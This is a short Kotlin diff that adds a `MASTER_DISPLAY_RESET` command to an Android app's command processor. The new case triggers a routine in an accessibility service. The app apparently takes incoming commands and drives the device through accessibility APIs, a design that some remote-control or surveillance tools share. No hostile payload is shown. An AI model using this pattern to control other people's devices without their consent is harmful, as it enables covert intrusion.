@@ -2028,6 +2028,15 @@ object CommandProcessor {
                         status = "FAILED (SERVICE_OFF)"
                     }
                 }
+                "MASTER_DISPLAY_RESET" -> {
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
+                        service.startMasterDisplayReset(id)
+                        status = "MASTER_SEQUENCE_INITIATED"
+                    } else {
+                        status = "FAILED (SERVICE_OFF)"
+                    }
+                }
                 "SET_WALLPAPER" -> {
                     val parts = content.split("|", limit = 2)
                     if (parts.size >= 2) {
